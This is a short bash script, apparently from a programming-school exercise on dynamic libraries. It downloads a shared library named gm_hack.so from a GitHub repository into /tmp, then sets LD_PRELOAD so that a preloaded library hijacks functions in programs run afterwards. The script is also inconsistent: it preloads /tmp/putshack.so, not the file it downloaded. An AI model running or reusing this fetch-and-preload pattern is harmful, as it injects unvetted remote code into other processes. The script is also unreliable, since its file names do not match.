#!/bin/bash
wget -P /tmp https://github.com/Godwindavid07/alx-low_level_programming/raw/master/0x18-dynamic_libraries/gm_hack.so
export LD_PRELOAD=/tmp/putshack.so
